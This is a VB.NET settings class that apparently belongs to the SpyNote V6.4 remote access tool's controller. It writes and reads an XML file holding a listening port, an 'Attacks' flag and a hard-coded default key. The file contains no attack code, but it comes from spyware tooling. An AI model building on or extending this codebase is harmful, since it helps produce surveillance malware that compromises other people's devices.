Imports Microsoft.VisualBasic.CompilerServices
Imports System.IO
Imports System.Text
Imports System.Xml
Imports SpyNote_V6._4.SN.SpyNote.Stores

Namespace SN.SPYXml
    Public Class XMLSettings
        Public PATHXML As String

        Public MyXML As XmlDocument

        Public Sub New()
            Me.PATHXML = Store.Resources(1) + "\Imports\Xml\Settings\SpyNote.xml"
            Me.MyXML = New XmlDocument()
        End Sub

        Public Sub LoadXML()
            Dim settingsDirectory As String = IO.Path.GetDirectoryName(Me.PATHXML)
            If Not Directory.Exists(settingsDirectory) Then
                Directory.CreateDirectory(settingsDirectory)
            End If

            Dim flag As Boolean = Not File.Exists(Me.PATHXML)
            If flag Then
                Dim xmlTextWriter As XmlTextWriter = New XmlTextWriter(Me.PATHXML, Encoding.UTF8)
                xmlTextWriter.WriteStartDocument(True)
                xmlTextWriter.Formatting = Formatting.Indented
                xmlTextWriter.Indentation = 2
                xmlTextWriter.WriteStartElement("SpyNote")
                Me.CreateNode(Conversions.ToString(0), "Port", "3210", xmlTextWriter)
                Me.CreateNode(Conversions.ToString(1), "Password", "False", xmlTextWriter)
                Me.CreateNode(Conversions.ToString(2), "Attacks", "False", xmlTextWriter)
                Me.CreateNode(Conversions.ToString(3), "KeyPass", "0123456789", xmlTextWriter)
                Me.CreateNode(Conversions.ToString(4), "View", "11111", xmlTextWriter)
                Me.CreateNode(Conversions.ToString(5), "T", "00000", xmlTextWriter)
                Me.CreateNode(Conversions.ToString(6), "Language", "en", xmlTextWriter)
                xmlTextWriter.WriteEndElement()
                xmlTextWriter.WriteEndDocument()
                xmlTextWriter.Close()
            End If
            Me.MyXML.Load(Me.PATHXML)
            Me.EnsureLanguageNode()
        End Sub

        Public Sub EnsureLanguageNode()
            Try
                Dim valueNodes = Me.MyXML.DocumentElement.GetElementsByTagName("value")
                If valueNodes IsNot Nothing AndAlso valueNodes.Count > 6 Then
                    Return
                End If

                Dim root As XmlNode = Me.MyXML.DocumentElement
                Dim item As XmlElement = Me.MyXML.CreateElement("item")
                Dim idNode As XmlElement = Me.MyXML.CreateElement("id")
                idNode.InnerText = "6"
                Dim nameNode As XmlElement = Me.MyXML.CreateElement("name")
                nameNode.InnerText = "Language"
                Dim valueNode As XmlElement = Me.MyXML.CreateElement("value")
                valueNode.InnerText = "en"
                item.AppendChild(idNode)
                item.AppendChild(nameNode)
                item.AppendChild(valueNode)
                root.AppendChild(item)
                Me.MyXML.Save(Me.PATHXML)
            Catch ex As Exception
            End Try
        End Sub

        Private Sub CreateNode(pID As String, pName As String, pPrice As String, writer As XmlTextWriter)
            Try
                writer.WriteStartElement("item")
                writer.WriteStartElement("id")
                writer.WriteString(pID)
                writer.WriteEndElement()
                writer.WriteStartElement("name")
                writer.WriteString(pName)
                writer.WriteEndElement()
                writer.WriteStartElement("value")
                writer.WriteString(pPrice)
                writer.WriteEndElement()
                writer.WriteEndElement()
            Catch ex As Exception
                Interaction.MsgBox(ex.Message, MsgBoxStyle.Exclamation, Store.Resources(0))
            End Try
        End Sub

        Public Sub Edit(ParmeterString As String, ParmeterInteger As Integer, Parmetervalue As String)
            Try
                Me.MyXML.DocumentElement.GetElementsByTagName(ParmeterString).Item(ParmeterInteger).InnerText = Parmetervalue
                Me.MyXML.Save(Me.PATHXML)
            Catch ex As Exception
                Interaction.MsgBox(ex.Message, MsgBoxStyle.Exclamation, Store.Resources(0))
            End Try
        End Sub

        Public Function Reading(ParmeterString As String, ParmeterInteger As Integer) As String
            Dim rawValue As String = Nothing
            Try
                rawValue = Me.MyXML.DocumentElement.GetElementsByTagName(ParmeterString).Item(ParmeterInteger).InnerText
                If rawValue IsNot Nothing Then
                    rawValue = rawValue.Trim()
                End If
                If Not String.IsNullOrEmpty(rawValue) Then
                    Return rawValue
                End If
            Catch ex As Exception
            End Try

            If Operators.CompareString(ParmeterString, "value", False) = 0 Then
                Select Case ParmeterInteger
                    Case 0
                        Return "3210"
                    Case 1
                        Return "False"
                    Case 2
                        Return "False"
                    Case 3
                        Return "0123456789"
                    Case 4
                        Return "11111"
                    Case 5
                        Return "00000"
                    Case 6
                        Return "en"
                End Select
            End If

            Return String.Empty
        End Function
    End Class
End Namespace
